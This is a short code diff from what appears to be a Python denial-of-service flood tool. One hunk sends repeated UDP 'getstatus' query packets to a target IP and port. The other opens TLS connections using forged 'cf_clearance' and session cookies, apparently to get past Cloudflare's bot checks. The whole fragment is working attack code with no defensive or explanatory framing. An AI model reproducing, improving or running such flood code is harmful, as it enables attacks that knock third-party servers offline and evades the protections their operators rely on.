@@ -745,7 +745,7 @@ def main():
                     try:
                         s = socket(AF_INET , SOCK_DGRAM)
                         for _ in range(rpc):
-                            payl = b'\xff\xff\xff\xff\x67\x65\x74\x73\x74\x61\x74\x75\x73\x10'
+                            payl = b'\xff\xff\xff\xff\x67\x65\x74\x73\x74\x61\x74\x75\x73'
                             s.sendto(payl , (ip_tt , port))
                     except:
                         pass
@@ -892,7 +892,6 @@ def main():
                             cookie = ("cf_clearance="+fake_cookie_phpsessid, "PHPSSID="+fake_cookie_phpsessidd)
                         if port == 443:
                             s = socket(AF_INET , SOCK_STREAM)
-                            s = SSLContext(PROTOCOL_TLSv1_2)
                             s = ctx.wrap_socket(s , server_hostname=ip_tt)
                             s.connect((ip_tt , port))
                         else:
